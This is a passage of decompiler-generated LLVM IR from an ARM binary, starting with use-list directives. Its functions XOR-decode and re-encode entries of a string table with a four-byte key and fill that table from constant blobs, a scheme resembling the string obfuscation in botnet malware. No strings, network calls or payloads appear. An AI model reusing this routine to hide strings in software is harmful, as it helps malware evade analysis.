  uselistorder i8 34, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 14, 15, 16, 17, 4, 5, 18, 19, 20, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 16, 17, 18, 19, 4, 5, 6, 7, 20, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 62, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 61, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i32 (i32)* @function_11874, { 3, 2, 0, 1 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_16698.80 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_e368, { 1, 0 }
  uselistorder i32 ptrtoint ([22 x i8]* @global_var_16680.74 to i32), { 0, 2, 1 }
  uselistorder i32 (i32)* @function_1026c, { 40, 39, 27, 26, 33, 38, 37, 36, 35, 34, 32, 31, 30, 29, 28, 25, 24, 2, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10904, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_10248, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 34, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37 }
  uselistorder i32 (i32)* @function_1030c, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 3, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_119bc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_11030, { 2, 0, 1 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_e868, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_119f4, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_11a68, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_c898, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_1f28c.183, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @function_c848, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_1f27e.180 to i16*), { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 10, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 62, { 2, 1, 0 }
  uselistorder i32 192, { 2, 3, 4, 0, 1 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1671c.174 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_16714.172 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_166d8.160 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @function_e930, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_166b4.152 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_166b8.150 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_1f295.147, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_1f288.141, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_1f288.141 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_1f294.142, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_1f274.138, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1f274.138 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @function_e0d0, { 74, 73, 72, 71, 70, 69, 68, 64, 67, 66, 65, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_11aa8, { 10, 9, 8, 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 2048, { 6, 5, 4, 8, 9, 1, 2, 3, 7, 0, 10, 11, 12 }
  uselistorder i32* @global_var_212f8.136, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_212f4.134, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_1f2a4.122, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @function_10f8c, { 0, 1, 2, 3, 4, 5, 8, 6, 7 }
  uselistorder i32 (i32)* @function_e12c, { 1, 0 }
  uselistorder i32* @global_var_212d8.45, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_212d8.45 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @function_10b08, { 2, 1, 0 }
  uselistorder i32 ()* @function_10ffc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10240, { 1, 0 }
  uselistorder label %dec_label_pc_f47c.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f47c.backedge.thread565, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_f47c.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_101f4, { 1, 0 }
  uselistorder label %dec_label_pc_10154, { 1, 0 }
  uselistorder label %dec_label_pc_ff50, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_ff18, { 1, 0 }
  uselistorder label %dec_label_pc_ff04, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fef4, { 1, 0 }
  uselistorder label %dec_label_pc_fde4, { 1, 0 }
  uselistorder label %dec_label_pc_fd18, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fd00, { 1, 0 }
  uselistorder label %dec_label_pc_fc14, { 1, 0 }
  uselistorder label %dec_label_pc_fb58, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fb40, { 1, 0 }
  uselistorder label %dec_label_pc_fa08, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f9f0, { 1, 0 }
  uselistorder label %dec_label_pc_f934, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f91c, { 1, 0 }
  uselistorder label %dec_label_pc_f8a8, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread102, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f874, { 1, 0 }
  uselistorder label %.thread98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f854, { 1, 0 }
  uselistorder label %dec_label_pc_f840, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f7fc, { 1, 0 }
  uselistorder label %dec_label_pc_f7fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f790, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f778, { 1, 0 }
  uselistorder label %dec_label_pc_f6ec, { 6, 7, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_f6e4, { 4, 2, 5, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_f6cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f588, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb425, { 1, 0 }
  uselistorder label %bb423, { 1, 0 }
  uselistorder label %dec_label_pc_f550, { 1, 0 }
  uselistorder label %dec_label_pc_f4e4, { 1, 0 }
  uselistorder label %.thread81, { 1, 0 }
  uselistorder label %dec_label_pc_f494, { 1, 0 }
  uselistorder label %dec_label_pc_f484, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f484.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f478.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f460, { 1, 0 }
  uselistorder label %bb419, { 1, 0 }
  uselistorder label %dec_label_pc_f384, { 1, 0 }
  uselistorder label %bb417, { 1, 0 }
  uselistorder label %bb415, { 1, 0 }
  uselistorder label %bb413, { 1, 0 }
  uselistorder label %bb411, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_f278.dec_label_pc_f278_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f254.dec_label_pc_f254_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f248, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_f230, { 1, 0 }
  uselistorder label %dec_label_pc_f20c, { 1, 0 }
  uselistorder label %dec_label_pc_f0bc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_f0a8, { 1, 0 }
  uselistorder label %bb408, { 1, 0 }
  uselistorder label %dec_label_pc_ef3c, { 1, 0 }
  uselistorder label %dec_label_pc_ef30, { 1, 0 }
  uselistorder label %dec_label_pc_ef24, { 1, 0 }
  uselistorder label %dec_label_pc_ef18, { 1, 0 }
  uselistorder label %dec_label_pc_ef0c, { 1, 0 }
  uselistorder label %dec_label_pc_eef8, { 1, 0 }
  uselistorder label %dec_label_pc_eee4, { 1, 0 }
  uselistorder label %dec_label_pc_eed0, { 1, 0 }
  uselistorder label %dec_label_pc_eeb0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee8c, { 1, 0 }
  uselistorder label %dec_label_pc_ee80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee38, { 1, 0 }
  uselistorder label %bb375, { 1, 0 }
  uselistorder label %dec_label_pc_ede4, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_ebd4, { 1, 0 }
}

define i32 @function_10248(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10248:
  store i32 ptrtoint (i32* @global_var_21304.199 to i32), i32* @r2, align 4
  %v3_1024c = mul i32 %arg1, 8
  %v2_10250 = add i32 %v3_1024c, ptrtoint (i32* @global_var_21304.199 to i32)
  store i32 %v2_10250, i32* @r3, align 4
  %v2_10254 = icmp eq i32* %arg2, null
  br i1 %v2_10254, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10248
  %v3_1025c4 = inttoptr i32 %v2_10250 to i32*
  %v4_1025c5 = load i32, i32* %v3_1025c4, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_10248
  %v2_10258 = add i32 %v3_1024c, add (i32 ptrtoint (i32* @global_var_21304.199 to i32), i32 4)
  %v3_10258 = inttoptr i32 %v2_10258 to i16*
  %v4_10258 = load i16, i16* %v3_10258, align 4
  %v5_10258 = zext i16 %v4_10258 to i32
  store i32 %v5_10258, i32* @r3, align 4
  %v3_1025c = inttoptr i32 %v2_10250 to i32*
  %v4_1025c = load i32, i32* %v3_1025c, align 4
  store i32 %v5_10258, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_1025c6 = phi i32 [ %v4_1025c5, %.thread ], [ %v4_1025c, %bb ]
  ret i32 %v4_1025c6

; uselistorder directives
  uselistorder i32 %v2_10250, { 1, 0, 2 }
  uselistorder i32 %v3_1024c, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_1026c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1026c:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10274 = mul i32 %arg1, 8
  %v2_10278 = add i32 %v3_10274, ptrtoint (i32* @global_var_21304.199 to i32)
  %v2_1027c = load i32, i32* inttoptr (i32 127124 to i32*), align 4
  %v1_10280 = add i32 %v3_10274, add (i32 ptrtoint (i32* @global_var_21304.199 to i32), i32 4)
  %v2_10280 = inttoptr i32 %v1_10280 to i16*
  %v3_10280 = load i16, i16* %v2_10280, align 4
  %v3_10284 = udiv i32 %v2_1027c, 256
  %v2_10288 = icmp eq i16 %v3_10280, 0
  store i1 %v2_10288, i1* @cpsr_z, align 1
  %v3_1028c = udiv i32 %v2_1027c, 65536
  store i32 %v3_1028c, i32* @r3, align 4
  %v3_10290 = load i32, i32* @r4, align 4
  store i32 %v3_10290, i32* %stack_var_-16, align 4
  %v1_10294 = urem i32 %v3_10284, 256
  store i32 %v1_10294, i32* %r6.global-to-local, align 4
  %v1_10298 = urem i32 %v3_1028c, 256
  store i32 %v1_10298, i32* %r5.global-to-local, align 4
  %v3_1029c = udiv i32 %v2_1027c, 16777216
  store i32 %v3_1029c, i32* %r4.global-to-local, align 4
  %v1_102a0 = urem i32 %v2_1027c, 256
  store i32 %v1_102a0, i32* %lr.global-to-local, align 4
  br i1 %v2_10288, label %dec_label_pc_102fc, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %dec_label_pc_1026c
  store i32 0, i32* @ip, align 4
  %v1_102ac = inttoptr i32 %v2_10278 to i32*
  br label %dec_label_pc_102ac

dec_label_pc_102ac:                               ; preds = %dec_label_pc_102ac.dec_label_pc_102ac_crit_edge, %dec_label_pc_102a8
  %v0_102b4 = phi i32 [ %v0_102b4.pre, %dec_label_pc_102ac.dec_label_pc_102ac_crit_edge ], [ %v1_102a0, %dec_label_pc_102a8 ]
  %v2_102b8 = phi i32 [ %v1_102f0, %dec_label_pc_102ac.dec_label_pc_102ac_crit_edge ], [ 0, %dec_label_pc_102a8 ]
  %v2_102ac = load i32, i32* %v1_102ac, align 4
  %v2_102b0 = add i32 %v2_102ac, %v2_102b8
  %v3_102b0 = inttoptr i32 %v2_102b0 to i8*
  %v4_102b0 = load i8, i8* %v3_102b0, align 1
  %v6_102b0 = zext i8 %v4_102b0 to i32
  %v2_102b4 = xor i32 %v6_102b0, %v0_102b4
  %v1_102b8 = trunc i32 %v2_102b4 to i8
  store i8 %v1_102b8, i8* %v3_102b0, align 1
  %v2_102bc = load i32, i32* %v1_102ac, align 4
  %v0_102c0 = load i32, i32* @ip, align 4
  %v2_102c0 = add i32 %v0_102c0, %v2_102bc
  %v3_102c0 = inttoptr i32 %v2_102c0 to i8*
  %v4_102c0 = load i8, i8* %v3_102c0, align 1
  %v6_102c0 = zext i8 %v4_102c0 to i32
  %v0_102c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_102c4 = xor i32 %v0_102c4, %v6_102c0
  %v1_102c8 = trunc i32 %v2_102c4 to i8
  store i8 %v1_102c8, i8* %v3_102c0, align 1
  %v2_102cc = load i32, i32* %v1_102ac, align 4
  %v0_102d0 = load i32, i32* @ip, align 4
  %v2_102d0 = add i32 %v0_102d0, %v2_102cc
  %v3_102d0 = inttoptr i32 %v2_102d0 to i8*
  %v4_102d0 = load i8, i8* %v3_102d0, align 1
  %v6_102d0 = zext i8 %v4_102d0 to i32
  %v0_102d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_102d4 = xor i32 %v0_102d4, %v6_102d0
  %v1_102d8 = trunc i32 %v2_102d4 to i8
  store i8 %v1_102d8, i8* %v3_102d0, align 1
  %v2_102dc = load i32, i32* %v1_102ac, align 4
  %v0_102e0 = load i32, i32* @ip, align 4
  %v2_102e0 = add i32 %v0_102e0, %v2_102dc
  %v3_102e0 = inttoptr i32 %v2_102e0 to i8*
  %v4_102e0 = load i8, i8* %v3_102e0, align 1
  %v6_102e0 = zext i8 %v4_102e0 to i32
  %v0_102e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_102e4 = xor i32 %v0_102e4, %v6_102e0
  store i32 %v2_102e4, i32* @r3, align 4
  %v1_102e8 = trunc i32 %v2_102e4 to i8
  store i8 %v1_102e8, i8* %v3_102e0, align 1
  %v3_102ec = load i16, i16* %v2_10280, align 4
  %v4_102ec = zext i16 %v3_102ec to i32
  %v0_102f0 = load i32, i32* @ip, align 4
  %v1_102f0 = add i32 %v0_102f0, 1
  store i32 %v1_102f0, i32* @ip, align 4
  %v9_102f4 = icmp eq i32 %v4_102ec, %v1_102f0
  store i1 %v9_102f4, i1* @cpsr_z, align 1
  %v8_102f8 = icmp sgt i32 %v4_102ec, %v1_102f0
  br i1 %v8_102f8, label %dec_label_pc_102ac.dec_label_pc_102ac_crit_edge, label %dec_label_pc_102fc.loopexit

dec_label_pc_102ac.dec_label_pc_102ac_crit_edge:  ; preds = %dec_label_pc_102ac
  %v0_102b4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_102ac

dec_label_pc_102fc.loopexit:                      ; preds = %dec_label_pc_102ac
  %v2_102fc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_102fc

dec_label_pc_102fc:                               ; preds = %dec_label_pc_102fc.loopexit, %dec_label_pc_1026c
  %v2_102fc = phi i32 [ %v2_102fc.pre, %dec_label_pc_102fc.loopexit ], [ %v3_10290, %dec_label_pc_1026c ]
  store i32 %v2_102fc, i32* @r4, align 4
  ret i32 %v2_10278

; uselistorder directives
  uselistorder i32 %v1_102f0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_102a0, { 1, 0 }
  uselistorder i32 %v3_1028c, { 1, 0 }
  uselistorder i32 %v2_1027c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_10278, { 1, 0 }
  uselistorder i32 %v3_10274, { 1, 0 }
}

define i32 @function_1030c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1030c:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10314 = mul i32 %arg1, 8
  %v2_10318 = add i32 %v3_10314, ptrtoint (i32* @global_var_21304.199 to i32)
  %v2_1031c = load i32, i32* inttoptr (i32 127124 to i32*), align 4
  %v1_10320 = add i32 %v3_10314, add (i32 ptrtoint (i32* @global_var_21304.199 to i32), i32 4)
  %v2_10320 = inttoptr i32 %v1_10320 to i16*
  %v3_10320 = load i16, i16* %v2_10320, align 4
  %v3_10324 = udiv i32 %v2_1031c, 256
  %v2_10328 = icmp eq i16 %v3_10320, 0
  %v3_1032c = udiv i32 %v2_1031c, 65536
  %v3_10330 = load i32, i32* @r4, align 4
  store i32 %v3_10330, i32* %stack_var_-16, align 4
  %v1_10334 = urem i32 %v3_10324, 256
  store i32 %v1_10334, i32* %r6.global-to-local, align 4
  %v1_10338 = urem i32 %v3_1032c, 256
  store i32 %v1_10338, i32* %r5.global-to-local, align 4
  %v3_1033c = udiv i32 %v2_1031c, 16777216
  store i32 %v3_1033c, i32* %r4.global-to-local, align 4
  %v1_10340 = urem i32 %v2_1031c, 256
  store i32 %v1_10340, i32* %lr.global-to-local, align 4
  br i1 %v2_10328, label %dec_label_pc_1039c, label %dec_label_pc_10348

dec_label_pc_10348:                               ; preds = %dec_label_pc_1030c
  store i32 0, i32* @ip, align 4
  %v1_1034c = inttoptr i32 %v2_10318 to i32*
  br label %dec_label_pc_1034c

dec_label_pc_1034c:                               ; preds = %dec_label_pc_1034c.dec_label_pc_1034c_crit_edge, %dec_label_pc_10348
  %v0_10354 = phi i32 [ %v0_10354.pre, %dec_label_pc_1034c.dec_label_pc_1034c_crit_edge ], [ %v1_10340, %dec_label_pc_10348 ]
  %v2_10358 = phi i32 [ %v1_10390, %dec_label_pc_1034c.dec_label_pc_1034c_crit_edge ], [ 0, %dec_label_pc_10348 ]
  %v2_1034c = load i32, i32* %v1_1034c, align 4
  %v2_10350 = add i32 %v2_1034c, %v2_10358
  %v3_10350 = inttoptr i32 %v2_10350 to i8*
  %v4_10350 = load i8, i8* %v3_10350, align 1
  %v6_10350 = zext i8 %v4_10350 to i32
  %v2_10354 = xor i32 %v6_10350, %v0_10354
  %v1_10358 = trunc i32 %v2_10354 to i8
  store i8 %v1_10358, i8* %v3_10350, align 1
  %v2_1035c = load i32, i32* %v1_1034c, align 4
  %v0_10360 = load i32, i32* @ip, align 4
  %v2_10360 = add i32 %v0_10360, %v2_1035c
  %v3_10360 = inttoptr i32 %v2_10360 to i8*
  %v4_10360 = load i8, i8* %v3_10360, align 1
  %v6_10360 = zext i8 %v4_10360 to i32
  %v0_10364 = load i32, i32* %r6.global-to-local, align 4
  %v2_10364 = xor i32 %v0_10364, %v6_10360
  %v1_10368 = trunc i32 %v2_10364 to i8
  store i8 %v1_10368, i8* %v3_10360, align 1
  %v2_1036c = load i32, i32* %v1_1034c, align 4
  %v0_10370 = load i32, i32* @ip, align 4
  %v2_10370 = add i32 %v0_10370, %v2_1036c
  %v3_10370 = inttoptr i32 %v2_10370 to i8*
  %v4_10370 = load i8, i8* %v3_10370, align 1
  %v6_10370 = zext i8 %v4_10370 to i32
  %v0_10374 = load i32, i32* %r5.global-to-local, align 4
  %v2_10374 = xor i32 %v0_10374, %v6_10370
  %v1_10378 = trunc i32 %v2_10374 to i8
  store i8 %v1_10378, i8* %v3_10370, align 1
  %v2_1037c = load i32, i32* %v1_1034c, align 4
  %v0_10380 = load i32, i32* @ip, align 4
  %v2_10380 = add i32 %v0_10380, %v2_1037c
  %v3_10380 = inttoptr i32 %v2_10380 to i8*
  %v4_10380 = load i8, i8* %v3_10380, align 1
  %v6_10380 = zext i8 %v4_10380 to i32
  %v0_10384 = load i32, i32* %r4.global-to-local, align 4
  %v2_10384 = xor i32 %v0_10384, %v6_10380
  %v1_10388 = trunc i32 %v2_10384 to i8
  store i8 %v1_10388, i8* %v3_10380, align 1
  %v3_1038c = load i16, i16* %v2_10320, align 4
  %v4_1038c = zext i16 %v3_1038c to i32
  %v0_10390 = load i32, i32* @ip, align 4
  %v1_10390 = add i32 %v0_10390, 1
  store i32 %v1_10390, i32* @ip, align 4
  %v8_10398 = icmp sgt i32 %v4_1038c, %v1_10390
  br i1 %v8_10398, label %dec_label_pc_1034c.dec_label_pc_1034c_crit_edge, label %dec_label_pc_1039c.loopexit

dec_label_pc_1034c.dec_label_pc_1034c_crit_edge:  ; preds = %dec_label_pc_1034c
  %v0_10354.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1034c

dec_label_pc_1039c.loopexit:                      ; preds = %dec_label_pc_1034c
  %v2_1039c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %dec_label_pc_1039c.loopexit, %dec_label_pc_1030c
  %v2_1039c = phi i32 [ %v2_1039c.pre, %dec_label_pc_1039c.loopexit ], [ %v3_10330, %dec_label_pc_1030c ]
  store i32 %v2_1039c, i32* @r4, align 4
  ret i32 %v2_10318

; uselistorder directives
  uselistorder i32 %v1_10390, { 1, 2, 0 }
  uselistorder i32 %v1_10340, { 1, 0 }
  uselistorder i32 %v2_1031c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_10318, { 1, 0 }
  uselistorder i32 %v3_10314, { 1, 0 }
}

define i32 @function_103ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_103ac:
  %v3_103ac = load i32, i32* @r4, align 4
  %v6_103ac = load i32, i32* @r5, align 4
  %v9_103ac = load i32, i32* @r6, align 4
  %v12_103ac = load i32, i32* @r7, align 4
  %v15_103ac = load i32, i32* @r8, align 4
  %v18_103ac = load i32, i32* @sb, align 4
  %v21_103ac = load i32, i32* @sl, align 4
  %v24_103ac = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_103b8 = call i32 @function_11d34()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_21304.199 to i32), i32* @r4, align 4
  store i32 %v0_103b8, i32* @r6, align 4
  %v4_103d0 = call i32 @function_108bc(i32 %v0_103b8, i32 ptrtoint ([3 x i8]* @global_var_1674c.206 to i32), i32 2)
  %v0_103d4 = load i32, i32* @r5, align 4
  store i32 %v0_103d4, i32* @r0, align 4
  %v0_103d8 = load i32, i32* @r6, align 4
  store i32 %v0_103d8, i32* @global_var_2130c.207, align 4
  %v1_103dc = trunc i32 %v0_103d4 to i16
  store i16 %v1_103dc, i16* bitcast (i32* @global_var_21310.208 to i16*), align 4
  %v0_103e0 = call i32 @function_11d34()
  %v0_103e4 = load i32, i32* @r5, align 4
  store i32 %v0_103e0, i32* @r6, align 4
  %v3_103f0 = call i32 @function_108bc(i32 %v0_103e0, i32 ptrtoint (i32* @global_var_16750.210 to i32), i32 %v0_103e4)
  store i32 29, i32* @r0, align 4
  %v0_103f8 = load i32, i32* @r6, align 4
  store i32 %v0_103f8, i32* @global_var_21314.211, align 4
  %v0_103fc = load i32, i32* @r5, align 4
  %v1_103fc = trunc i32 %v0_103fc to i16
  store i16 %v1_103fc, i16* bitcast (i32* @global_var_21318.212 to i16*), align 4
  %v0_10400 = call i32 @function_11d34()
  store i32 %v0_10400, i32* @r5, align 4
  %v3_10410 = call i32 @function_108bc(i32 %v0_10400, i32 ptrtoint (i32* @global_var_168b8.214 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_21320.215 to i16*), align 4
  %v0_10420 = load i32, i32* @r5, align 4
  store i32 %v0_10420, i32* @global_var_2131c.216, align 4
  %v0_10424 = call i32 @function_11d34()
  store i32 6, i32* @sb, align 4
  store i32 %v0_10424, i32* @r5, align 4
  %v4_10438 = call i32 @function_108bc(i32 %v0_10424, i32 ptrtoint ([7 x i8]* @global_var_16754.218 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_10444 = load i32, i32* @r5, align 4
  store i32 %v0_10444, i32* @global_var_21324.219, align 4
  %v0_10448 = load i32, i32* @sb, align 4
  %v1_10448 = trunc i32 %v0_10448 to i16
  store i16 %v1_10448, i16* bitcast (i32* @global_var_21328.220 to i16*), align 4
  %v0_1044c = call i32 @function_11d34()
  %v0_10454 = load i32, i32* @r7, align 4
  store i32 %v0_1044c, i32* @r5, align 4
  %v4_1045c = call i32 @function_108bc(i32 %v0_1044c, i32 ptrtoint ([8 x i8]* @global_var_1675c.222 to i32), i32 %v0_10454)
  %v0_10460 = load i32, i32* @r7, align 4
  store i32 %v0_10460, i32* @r0, align 4
  %v0_10464 = load i32, i32* @r5, align 4
  store i32 %v0_10464, i32* @global_var_2132c.223, align 4
  %v1_10468 = trunc i32 %v0_10460 to i16
  store i16 %v1_10468, i16* bitcast (i32* @global_var_21330.224 to i16*), align 4
  %v0_1046c = call i32 @function_11d34()
  %v0_10474 = load i32, i32* @r7, align 4
  store i32 %v0_1046c, i32* @r5, align 4
  %v4_1047c = call i32 @function_108bc(i32 %v0_1046c, i32 ptrtoint ([8 x i8]* @global_var_16764.226 to i32), i32 %v0_10474)
  store i32 3, i32* @r0, align 4
  %v0_10484 = load i32, i32* @r5, align 4
  store i32 %v0_10484, i32* @global_var_21334.227, align 4
  %v0_10488 = load i32, i32* @r7, align 4
  %v1_10488 = trunc i32 %v0_10488 to i16
  store i16 %v1_10488, i16* bitcast (i32* @global_var_21338.228 to i16*), align 4
  %v0_1048c = call i32 @function_11d34()
